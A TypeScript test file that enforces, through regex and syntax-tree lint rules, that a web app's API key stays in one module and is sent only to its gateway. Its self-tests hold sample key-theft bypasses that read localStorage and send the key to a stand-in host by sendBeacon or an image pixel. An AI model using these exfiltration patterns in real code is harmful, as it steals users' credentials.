/**
 * The API key reaches a request in exactly one place, and no module but its
 * owner holds it (N50; sol #2857; astra rounds 2, 3 and 4).
 *
 * The boundary (lib/gateway-base.ts, rules 1-3):
 * - lib/authorized-fetch.ts holds the key in a module-private variable and
 *   persists it. It exports setStoredApiKey, hasStoredApiKey,
 *   onStoredKeyChange, authorizedFetch and installGatewayKeyGuard, and none of
 *   them returns the key (checked here, and at run time in
 *   lib/__tests__/key-boundary-r4.test.ts).
 * - fetchWithKey() in lib/gateway-base.ts is the only code that puts a key on
 *   a request, and only toward the gateway.
 *
 * This file holds every production module to that as text, with no exemption
 * for any page or line. Only the key's owner and the boundary do what these
 * rules forbid elsewhere:
 *   1. getAuthHeaders appears nowhere.
 *   2. The key's storage slot is named only in lib/authorized-fetch.ts. Any
 *      other use of localStorage or sessionStorage is a getItem, setItem or
 *      removeItem call on a slot named by one plain string literal: no
 *      computed or concatenated name, no enumeration, no alias, no brackets.
 *   3. No module reaches a global by a computed name (window[...],
 *      Reflect.get(window, ...)), runs a string as code (eval, new Function),
 *      or imports the key's owner or the auth store whole or by a computed
 *      path.
 *   4. Only lib/gateway-base.ts builds an Authorization header or a "Bearer "
 *      value, or uses sendBeacon, XMLHttpRequest or WebSocket. The quickstart
 *      scripts AgentLinkPage shows for users to run build such a header for
 *      the user's agent; they are text assets (pages/agent-link/*.js.txt),
 *      not code, so they need no exemption.
 *   5. At run time the store's state holds no key, and the key's owner and
 *      the store export exactly the functions named above.
 *   6. Syntax rules (astra round 4), read from the parsed file, so strings,
 *      comments and JSX text are never taken for code, and a string built
 *      from literals is judged by what it spells. The global object is only
 *      read by named member (window.x) or asked its type; never aliased,
 *      passed, cast, indexed or used to reach another window. No Reflect,
 *      no window handles (defaultView, contentWindow, opener), no new
 *      Image(), no string run as code (Function, .constructor(), string
 *      timers) or modules imported by pattern (import.meta.glob). No module
 *      writes fetch, a property of window, navigator or document, or a
 *      prototype's method, except navigation and Google Analytics' bootstrap.
 * The self-tests run the rules over astra's round-3 and round-4 bypasses and
 * over a quickstart line moved into code, and each must be caught.
 *
 * What this is, and isn't. It holds our own modules, written in good faith,
 * to one path for the key: a mistake, or a shortcut, fails the build. It is a
 * lint, not a sandbox. Code written to get past it can: a name computed at
 * run time (atob, a lookup table) is invisible to any static check, and a
 * hostile script on this origin (an XSS, a compromised dependency) isn't in
 * this tree at all. Against those, the key is as safe as localStorage, which
 * is to say readable. Only an HttpOnly gateway session would put it out of
 * JavaScript's reach: a gateway change awaiting the operator's decision (bus
 * #4459). The runtime egress guard (lib/gateway-base.ts) is defence in depth
 * for fetch and sendBeacon, not a boundary.
 */

import { describe, expect, it } from "vitest";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join, relative, sep } from "node:path";
import ts from "typescript";
import * as keyOwner from "../lib/authorized-fetch.js";
import * as store from "../stores/auth-store.js";
import claudeQuickstart from "../pages/agent-link/pcc-agent.js.txt?raw";

const SRC = join(dirname(fileURLToPath(import.meta.url)), "..");

const KEY_OWNER = "lib/authorized-fetch.ts";
const BOUNDARY = "lib/gateway-base.ts";

interface Source {
  rel: string;
  lines: string[];
}

function productionFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((name) => {
    const full = join(dir, name);
    if (statSync(full).isDirectory()) return name === "__tests__" ? [] : productionFiles(full);
    return /\.(ts|tsx|js|jsx|mjs|cjs)$/.test(name) && !/\.(test|spec)\.[jt]sx?$/.test(name) && !name.endsWith(".d.ts") ? [full] : [];
  });
}

const FILES: Source[] = productionFiles(SRC).map((full) => ({
  rel: relative(SRC, full).split(sep).join("/"),
  lines: readFileSync(full, "utf-8").split("\n"),
}));

const isComment = (line: string) => /^\s*(\/\/|\*|\/\*)/.test(line);

/** Building an Authorization header in any form: an object key, a header name, or a set/append call. */
const AUTHORIZATION = /["'`]authorization["'`]|\bauthorization\s*:|\.(?:set|append)\(\s*["'`]authorization/i;
/** Building a Bearer credential: a template, a concatenation, or a "Bearer " literal. */
const BEARER = /Bearer\s*\$\{|["'`]Bearer\s+["'`]?\s*\+|["'`]Bearer\s/;
/** Requests other than fetch: the egress guard can't see XMLHttpRequest or WebSocket, and sees sendBeacon only once installed. */
const OTHER_EGRESS = /\bsendBeacon\b|\bXMLHttpRequest\b|\bWebSocket\s*\(/;

/** localStorage or sessionStorage, as an identifier. */
const WEB_STORAGE = /\b(?:local|session)Storage\b/g;
/** The one use of web storage allowed outside the key's owner: a call on a slot named by one plain string literal. */
const LITERAL_SLOT_CALL = /^\s*\.\s*(?:(?:getItem|removeItem)\(\s*(["'])[^"'`\\]*\1\s*\)|setItem\(\s*(["'])[^"'`\\]*\2\s*,)/;

function misusesStorage(line: string): boolean {
  // Named as a string (window["localStorage"]), or reached through Storage itself.
  if (/["'`](?:local|session)Storage["'`]|\bStorage\s*\.\s*prototype\b/.test(line)) return true;
  for (const m of line.matchAll(WEB_STORAGE)) {
    if (!LITERAL_SLOT_CALL.test(line.slice((m.index ?? 0) + m[0].length))) return true;
  }
  return false;
}

/** A global reached by a name the reader can't see ("obj.window[" is a property, not the global). */
const COMPUTED_GLOBAL = /(?<![.\w$])(?:window|globalThis|self)\s*(?:\?\.\s*)?\[|\bReflect\s*\.\s*get\s*\(\s*(?:window|globalThis|self)\b/;
/** A string run as code. */
const EVAL = /\beval\s*\(|\bnew\s+Function\s*\(/;
const KEY_HOLDER = String.raw`(?:auth-store|authorized-fetch)(?:\.[jt]sx?)?`;
/** The key's owner or the store imported whole (so any export is reachable by a computed name), or any module imported by a computed path. */
const WHOLE_IMPORT = new RegExp(
  [
    String.raw`\bimport\s*\*\s*as\s+[\w$]+\s+from\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bexport\s*\*\s*(?:as\s+[\w$]+\s+)?from\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bimport\s*\(\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bimport\s*\(\s*(?!["'][^"'\x60]*["']\s*\))`,
  ].join("|"),
);

interface Rule {
  id: string;
  /** The modules whose job this is. */
  owners: string[];
  /** Whether a trimmed, non-comment line breaks the rule (line rules). */
  breaks?: (line: string) => boolean;
  /** The nodes that break the rule (syntax rules, below). */
  find?: (sf: ts.SourceFile) => ts.Node[];
  fix: string;
}

// ---------------------------------------------------------------------------
// Syntax rules (astra A03d F1). A line can't tell code from a string, and a
// name can be split across a "+". These read the file as TypeScript parses
// it: comments, string contents and JSX text are never taken for code, and a
// string built from literals is judged by what it spells.
// ---------------------------------------------------------------------------

/** The global object, by its three names. */
const GLOBAL_NAMES = new Set(["window", "globalThis", "self"]);
/** Objects whose properties our modules read but never replace. */
const WRITE_ROOTS = new Set([...GLOBAL_NAMES, "navigator", "document"]);
/** Writes that replace nothing a key passes through: navigation, and Google Analytics' bootstrap (lib/telemetry.ts). */
const GLOBAL_WRITES_ALLOWED = new Set(["window.location.href", "window.dataLayer", "window.gtag"]);
/** Properties that hand back a window. */
const WINDOW_HANDLES = new Set(["defaultView", "contentWindow", "opener"]);
const GLOBAL_WINDOW_PROPS = new Set(["top", "parent", "frames", "opener", "self", "window", "globalThis"]);

function walk(node: ts.Node, visit: (n: ts.Node) => void): void {
  visit(node);
  ts.forEachChild(node, (child) => walk(child, visit));
}

function nodes(sf: ts.SourceFile, test: (n: ts.Node) => boolean): ts.Node[] {
  const out: ts.Node[] = [];
  walk(sf, (n) => {
    if (test(n)) out.push(n);
  });
  return out;
}

/** An identifier that names something here, rather than a member or a key: x.window, { self: 1 }, interface { window: … }. */
function isNameOnly(id: ts.Identifier): boolean {
  const p = id.parent;
  if (ts.isPropertyAccessExpression(p) && p.name === id) return true;
  if (ts.isQualifiedName(p) && p.right === id) return true;
  if ((ts.isPropertyAssignment(p) || ts.isPropertySignature(p) || ts.isPropertyDeclaration(p) || ts.isMethodDeclaration(p) || ts.isMethodSignature(p)) && p.name === id) return true;
  if ((ts.isJsxAttribute(p) || ts.isEnumMember(p) || ts.isGetAccessor(p) || ts.isSetAccessor(p)) && p.name === id) return true;
  return false;
}

/** What a string expression spells, when it is built only from literals: "local" + "Storage", `pcc-${"api"}-key`. */
function spelled(n: ts.Node): string | null {
  if (ts.isStringLiteral(n) || ts.isNoSubstitutionTemplateLiteral(n)) return n.text;
  if (ts.isParenthesizedExpression(n)) return spelled(n.expression);
  if (ts.isBinaryExpression(n) && n.operatorToken.kind === ts.SyntaxKind.PlusToken) {
    const l = spelled(n.left);
    const r = l === null ? null : spelled(n.right);
    return l !== null && r !== null ? l + r : null;
  }
  if (ts.isTemplateExpression(n)) {
    let text = n.head.text;
    for (const span of n.templateSpans) {
      const part = spelled(span.expression);
      if (part === null) return null;
      text += part + span.literal.text;
    }
    return text;
  }
  return null;
}

/** The identifier an access chain starts from: window in window.a.b or window["a"].b. */
function rootOf(n: ts.Node): ts.Node {
  let e = n;
  while (ts.isPropertyAccessExpression(e) || ts.isElementAccessExpression(e) || ts.isParenthesizedExpression(e) || ts.isNonNullExpression(e)) e = e.expression;
  return e;
}

const isAssignment = (k: ts.SyntaxKind) => k >= ts.SyntaxKind.FirstAssignment && k <= ts.SyntaxKind.LastAssignment;

/** Object's methods that change another object's properties or prototype. */
const MUTATION_APIS = new Set(["defineProperty", "defineProperties", "assign", "setPrototypeOf"]);
/** The legacy accessor definers, called on the object they change. */
const LEGACY_DEFINERS = new Set(["__defineGetter__", "__defineSetter__"]);
/** Built-ins a request, its headers or the key pass through, or that hold everything else. */
const BUILTINS = new Set([
  "Headers", "Request", "Response", "Storage", "Navigator", "Window", "Document", "XMLHttpRequest", "WebSocket",
  "EventSource", "URL", "Blob", "FormData", "Object", "Function", "Array", "Promise", "JSON", "fetch",
]);

/** The object a mutation API call changes: Object.defineProperty(target, …), or target.__defineGetter__(…). */
function mutationTarget(call: ts.CallExpression): ts.Expression | null {
  const callee = call.expression;
  if (!ts.isPropertyAccessExpression(callee)) return null;
  if (ts.isIdentifier(callee.expression) && callee.expression.text === "Object" && MUTATION_APIS.has(callee.name.text)) {
    return call.arguments[0] ?? null;
  }
  return LEGACY_DEFINERS.has(callee.name.text) ? callee.expression : null;
}

/** A global (window, navigator, document …), anything reached from one, a built-in, or any prototype. */
function isProtected(target: ts.Expression, sf: ts.SourceFile): boolean {
  const root = rootOf(target);
  if (ts.isIdentifier(root) && (WRITE_ROOTS.has(root.text) || BUILTINS.has(root.text))) return true;
  return /(?:^|\.)prototype(?:\.|$)/.test(target.getText(sf).replace(/\s+/g, ""));
}

/** A use of the global object other than reading a named member (window.x) or asking its type (typeof window). */
function globalAliases(sf: ts.SourceFile): ts.Node[] {
  return nodes(sf, (n) => {
    if (!ts.isIdentifier(n) || !GLOBAL_NAMES.has(n.text) || isNameOnly(n)) return false;
    const p = n.parent;
    if (ts.isPropertyAccessExpression(p) && p.expression === n && !GLOBAL_WINDOW_PROPS.has(p.name.text)) return false;
    if (ts.isTypeOfExpression(p) || ts.isTypeQueryNode(p) || (ts.isQualifiedName(p) && p.left === n)) return false;
    return true; // aliased, passed, cast, spread, indexed, compared, or a window handle (window.top) …
  });
}

const RULES: Rule[] = [
  {
    id: "get-auth-headers",
    owners: [],
    breaks: (l) => /\bgetAuthHeaders\b/.test(l),
    fix: "Send the key with authorizedFetch (lib/authorized-fetch.ts).",
  },
  {
    id: "key-slot",
    owners: [KEY_OWNER],
    breaks: (l) => /pcc-api-key/.test(l),
    fix: "Only lib/authorized-fetch.ts touches the key's storage slot.",
  },
  {
    id: "storage-by-literal-slot",
    owners: [KEY_OWNER],
    breaks: misusesStorage,
    fix: 'Name the slot with one string literal, e.g. localStorage.getItem("pcc-tour-seen").',
  },
  {
    id: "computed-global",
    owners: [],
    breaks: (l) => COMPUTED_GLOBAL.test(l),
    fix: "Name the global you use.",
  },
  {
    id: "eval",
    owners: [],
    breaks: (l) => EVAL.test(l),
    fix: "Don't run a string as code.",
  },
  {
    id: "whole-or-computed-import",
    owners: [],
    breaks: (l) => WHOLE_IMPORT.test(l),
    fix: "Import the named functions you use, from a literal path.",
  },
  {
    id: "auth-header",
    owners: [BOUNDARY],
    breaks: (l) => AUTHORIZATION.test(l) || BEARER.test(l),
    fix: "Send the key with authorizedFetch (lib/authorized-fetch.ts); never build the header.",
  },
  {
    id: "other-egress",
    owners: [BOUNDARY],
    breaks: (l) => OTHER_EGRESS.test(l),
    fix: "Use fetch, which the egress guard covers.",
  },
  // Syntax rules (astra A03d F1).
  {
    id: "global-alias",
    owners: [BOUNDARY],
    find: globalAliases,
    fix: "Read a named member (window.innerWidth). Don't alias, pass, cast or index the global object, or reach another window (window.top).",
  },
  {
    id: "window-handle",
    owners: [],
    find: (sf) => nodes(sf, (n) => ts.isPropertyAccessExpression(n) && WINDOW_HANDLES.has(n.name.text)),
    fix: "Don't reach a window through a document, a frame or an opener.",
  },
  {
    id: "reflect",
    owners: [],
    find: (sf) => nodes(sf, (n) => ts.isIdentifier(n) && n.text === "Reflect" && !isNameOnly(n)),
    fix: "Name the property you read.",
  },
  {
    id: "spelled-name",
    owners: [KEY_OWNER],
    find: (sf) =>
      nodes(sf, (n) => {
        if (n.parent && ts.isBinaryExpression(n.parent) && n.parent.operatorToken.kind === ts.SyntaxKind.PlusToken && spelled(n.parent) !== null) return false; // judged whole
        const text = spelled(n);
        return text !== null && /pcc-api-key|(?:local|session)Storage/.test(text);
      }),
    fix: "Only lib/authorized-fetch.ts names the key's slot; name web storage as the identifier, with a literal slot.",
  },
  {
    id: "global-write",
    owners: [BOUNDARY],
    find: (sf) =>
      nodes(sf, (n) => {
        // The same replacement through a mutation API (astra A03e F1): Object.defineProperty(Headers.prototype, …).
        if (ts.isCallExpression(n)) {
          const target = mutationTarget(n);
          return target !== null && isProtected(target, sf);
        }
        if (!ts.isBinaryExpression(n) || !isAssignment(n.operatorToken.kind)) return false;
        const target = n.left;
        if (ts.isIdentifier(target)) return target.text === "fetch";
        if (GLOBAL_WRITES_ALLOWED.has(target.getText(sf).replace(/\s+/g, ""))) return false;
        const root = rootOf(target);
        if (ts.isIdentifier(root) && WRITE_ROOTS.has(root.text)) return true;
        // X.prototype.y = …: a built-in's behaviour replaced for everyone.
        return ts.isPropertyAccessExpression(target) && /(?:^|\.)prototype\./.test(target.getText(sf).replace(/\s+/g, ""));
      }),
    fix: "Don't replace fetch, a global's property or a prototype's method: the key passes through them.",
  },
  {
    id: "image-egress",
    owners: [],
    find: (sf) => nodes(sf, (n) => ts.isNewExpression(n) && ts.isIdentifier(n.expression) && n.expression.text === "Image"),
    fix: "Load images with an element the page renders; don't send requests through new Image().",
  },
  {
    id: "code-from-string",
    owners: [],
    find: (sf) =>
      nodes(sf, (n) => {
        if (ts.isPropertyAccessExpression(n) && ts.isMetaProperty(n.expression) && /^glob/.test(n.name.text)) return true; // import.meta.glob imports modules whole
        if (!ts.isCallExpression(n) && !ts.isNewExpression(n)) return false;
        const callee = n.expression;
        if (ts.isIdentifier(callee) && callee.text === "Function") return true;
        if (ts.isPropertyAccessExpression(callee) && callee.name.text === "constructor") return true;
        const name = ts.isIdentifier(callee) ? callee.text : ts.isPropertyAccessExpression(callee) ? callee.name.text : "";
        const first = n.arguments?.[0];
        return (name === "setTimeout" || name === "setInterval") && first !== undefined && spelled(first) !== null;
      }),
    fix: "Don't run a string as code, or import modules by pattern.",
  },
];

interface Hit {
  rule: string;
  file: string;
  n: number;
  text: string;
}

function kindOf(rel: string): ts.ScriptKind {
  if (rel.endsWith(".tsx")) return ts.ScriptKind.TSX;
  if (rel.endsWith(".jsx")) return ts.ScriptKind.JSX;
  return /\.[mc]?js$/.test(rel) ? ts.ScriptKind.JS : ts.ScriptKind.TS;
}

const parsed = new Map<Source, ts.SourceFile>();
function syntaxOf(f: Source): ts.SourceFile {
  let sf = parsed.get(f);
  if (!sf) {
    sf = ts.createSourceFile(f.rel, f.lines.join("\n"), ts.ScriptTarget.Latest, true, kindOf(f.rel));
    parsed.set(f, sf);
  }
  return sf;
}

function violations(files: Source[], rules: Rule[] = RULES): Hit[] {
  return rules.flatMap((rule) =>
    files
      .filter((f) => !rule.owners.includes(f.rel))
      .flatMap((f) => {
        if (rule.find) {
          const sf = syntaxOf(f);
          return rule.find(sf).map((node) => ({
            rule: rule.id,
            file: f.rel,
            n: sf.getLineAndCharacterOfPosition(node.getStart(sf)).line + 1,
            text: node.getText(sf).replace(/\s+/g, " ").trim(),
          }));
        }
        return f.lines
          .map((line, i) => ({ rule: rule.id, file: f.rel, n: i + 1, text: line.trim() }))
          .filter(({ text }) => !isComment(text) && rule.breaks!(text));
      }),
  );
}

const show = (h: Hit) => `[${h.rule}] ${h.file}:${h.n} ${h.text.slice(0, 120)}`;

describe("only lib/authorized-fetch.ts holds the API key, and only fetchWithKey sends it (N50)", () => {
  it("scans the production tree", () => {
    expect(FILES.map((f) => f.rel)).toEqual(expect.arrayContaining([KEY_OWNER, BOUNDARY, "stores/auth-store.ts", "pages/AgentLinkPage.tsx"]));
  });

  for (const rule of RULES) {
    it(`${rule.id}: no production module breaks it`, () => {
      expect(violations(FILES, [rule]).map(show), rule.fix).toEqual([]);
    });
  }

  it("the key's owner and the auth store export exactly the boundary's functions", () => {
    expect(Object.keys(keyOwner).sort()).toEqual(["authorizedFetch", "hasStoredApiKey", "installGatewayKeyGuard", "onStoredKeyChange", "setStoredApiKey"]);
    expect(Object.keys(store).sort()).toEqual(["adoptApiKey", "onIdentityChange", "useAuthStore"]);
  });

  it("the auth store's state holds no key, even while one is held", () => {
    // Built at run time: a key-shaped literal in source trips the secret scanners (pack and push gates).
    store.adoptApiKey(["pcc", "test", "ratchet0123456789abcdef"].join("_"));
    try {
      const state = store.useAuthStore.getState();
      expect(state.isAuthenticated).toBe(true);
      expect("apiKey" in state).toBe(false);
      expect(Object.values(state).some((v) => typeof v === "string" && /^pcc_/.test(v))).toBe(false);
    } finally {
      store.adoptApiKey(null);
    }
  });
});

describe("the rules catch each known way around them (self-test)", () => {
  const caught = (code: string, rel = "pages/Probe.ts") => violations([{ rel, lines: code.split("\n") }]).map((h) => h.rule);

  it("astra round 3, bypass A: the store imported whole, a reader reached by a computed name, sent by beacon", () => {
    const rules = caught(
      [
        'import * as auth from "../stores/auth-store.js";',
        "const read = (auth as unknown as Record<string, unknown>)[",
        '  "readApiKeyFor" + "AuthorizedFetch"',
        "] as () => string | null;",
        'navigator.sendBeacon("https://foreign.example/collect", read() ?? "");',
      ].join("\n"),
    );
    expect(rules).toEqual(expect.arrayContaining(["whole-or-computed-import", "other-egress"]));
  });

  it("astra round 3, bypass B: the storage slot read by a concatenated name, sent by beacon", () => {
    const rules = caught(
      ['const key = localStorage.getItem("pcc-" + "api-key");', 'if (key) navigator.sendBeacon("https://foreign.example/collect", key);'].join("\n"),
    );
    expect(rules).toEqual(expect.arrayContaining(["storage-by-literal-slot", "other-egress"]));
  });

  it("astra round 3, DISPLAY_ONLY: the quickstart's header line, moved into a module, is caught", () => {
    const headerLine = claudeQuickstart.split("\n").find((l) => /Authorization/.test(l));
    expect(headerLine).toBe('  if (PCC_API_KEY) headers["Authorization"] = `Bearer ${PCC_API_KEY}`;');
    expect(caught(headerLine!, "pages/AgentLinkPage.tsx")).toEqual(["auth-header"]);
  });

  it("astra round 4: the global aliased, read with Reflect.get by a concatenated name, sent by an image", () => {
    const probe = [
      "const root = window;",
      'const slotOwner = Reflect.get(root, "local" + "Storage") as Storage;',
      'const key = slotOwner.getItem("pcc-" + "api-key");',
      "if (key) {",
      "  const pixel = new Image();",
      '  pixel.src = "https://foreign.example/collect?k=" + encodeURIComponent(key);',
      "}",
    ];
    // Each step on its own is caught: the alias, the read, the slot, and the egress.
    for (const n of [0, 1, 2, 4]) expect(caught(probe.join("\n").split("\n").slice(n, n + 1).join("\n")), probe[n]).not.toEqual([]);
  });

  it("astra round 4: fetch replaced, to watch what authorizedFetch sends", () => {
    for (const line of [
      "window.fetch = spy;",
      "globalThis.fetch = (input, init) => spy(input, init);",
      "fetch = spy;",
      'Object.defineProperty(window, "fetch", { value: spy });',
    ]) {
      expect(caught(line), line).not.toEqual([]);
    }
  });

  it("each syntax rule catches its kind (astra A03d F1)", () => {
    const cases: Array<[string, string]> = [
      ["global-alias", "const s = self;"],
      ["global-alias", "Object.assign(window, { fetch: spy });"],
      ["global-alias", "const { localStorage: s } = window;"],
      ["global-alias", "const t = window.top;"],
      ["global-alias", "const d = (globalThis as any).document;"],
      ["window-handle", "const w = document.defaultView;"],
      ["window-handle", "const w = frame.contentWindow;"],
      ["reflect", "const v = Reflect.get(obj, name);"],
      ["spelled-name", 'const n = "session" + "Storage";'],
      ["spelled-name", "const n = `pcc-${\"api\"}-key`;"],
      ["global-write", "navigator.sendBeacon = spy;"],
      ["global-write", "Headers.prototype.set = spy;"],
      ["global-write", 'window["fetch"] = spy;'],
      ["image-egress", "const img = new Image(1, 1);"],
      ["code-from-string", 'const g = Function("return this")();'],
      ["code-from-string", '(() => 0).constructor("return this")();'],
      ["code-from-string", 'setTimeout("steal()", 0);'],
      ["code-from-string", 'const mods = import.meta.glob("../lib/*.ts", { eager: true });'],
    ];
    for (const [rule, line] of cases) expect(caught(line), line).toContain(rule);
  });

  it("astra round 5: a built-in or global replaced through a mutation API, not an assignment", () => {
    for (const line of [
      'Object.defineProperty(Headers.prototype, "set", { value: observe });',
      "Object.assign(Headers.prototype, { set: observe });",
      'Object.defineProperties(Request.prototype, { headers: { get: observe } });',
      'Object.defineProperty(navigator, "sendBeacon", { value: observe });',
      "Object.setPrototypeOf(Headers.prototype, Spy.prototype);",
    ]) {
      expect(caught(line), line).toContain("global-write");
    }
  });

  it("the syntax rules let through what the app does", () => {
    for (const [code, rel] of [
      ['window.location.href = "/";', "pages/Probe.ts"],
      ['if (typeof window !== "undefined") window.addEventListener("storage", onChange);', "pages/Probe.ts"],
      ["const w = window.innerWidth;", "pages/Probe.ts"],
      ["type W = typeof window;", "pages/Probe.ts"],
      ['const tip = "A challenge window opens; self-attested at tier 0.";', "pages/Probe.ts"],
      ["const el = <p>The challenge window opens, then funds release.</p>;", "pages/Probe.tsx"],
      ["const frame = trace.frames[0];", "pages/Probe.ts"],
      ["setTimeout(() => setOpen(false), 300);", "pages/Probe.ts"],
      ["const merged = Object.assign({}, defaults, overrides);", "pages/Probe.ts"],
      ['Object.defineProperty(instance, "label", { value: "x" });', "pages/Probe.ts"],
    ]) {
      expect(caught(code, rel), code).toEqual([]);
    }
  });

  it("other ways to reach the slot, a reader, or the network", () => {
    for (const line of [
      "const k = localStorage.getItem(name);",
      "const k = localStorage.getItem(`pcc-${'api'}-key`);",
      "for (let i = 0; i < localStorage.length; i++) localStorage.key(i);",
      "const all = Object.entries(localStorage);",
      "send(JSON.stringify(localStorage));",
      "const copy = { ...localStorage };",
      "const v = localStorage[slot];",
      "const ls = localStorage;",
      'sessionStorage.setItem(slot, "x");',
      'const s = window["local" + "Storage"];',
      'const s = globalThis["localStorage"];',
      "const s = self?.[name];",
      "const s = Reflect.get(window, name);",
      "const g = Storage.prototype.getItem;",
      'const mod = await import("../stores/" + "auth-store.js");',
      'const mod = await import("../lib/authorized-fetch.js");',
      'import * as keys from "../lib/authorized-fetch.js";',
      'export * from "../stores/auth-store.js";',
      "eval(source);",
      'const f = new Function("return 1");',
      "const x = new XMLHttpRequest();",
      'const ws = new WebSocket("wss://foreign.example");',
      "headers: { Authorization: `Bearer ${key}` },",
      'headers: { "authorization": token },',
      'h.set("Authorization", v);',
      'const auth = "Bearer " + key;',
      "const auth = `Bearer ${key}`;",
    ]) {
      expect(caught(line), line).not.toEqual([]);
    }
  });

  it("lets through what the app does today", () => {
    for (const line of [
      'const seen = localStorage.getItem("pcc-tour-seen");',
      'localStorage.setItem("pcc-tour-seen", "true");',
      'localStorage.removeItem("pcc-tour-seen");',
      'const label = "Authorized";',
      'import("./pages/DashboardPage.js").then((m) => ({ default: m.DashboardPage }))',
      'import { authorizedFetch } from "../lib/authorized-fetch.js";',
      'const es = new EventSource("/api/traces/stream");',
      "const frame = trace.frames[currentFrame];",
      "const w = layout.window[0];",
    ]) {
      expect(caught(line), line).toEqual([]);
    }
  });
});
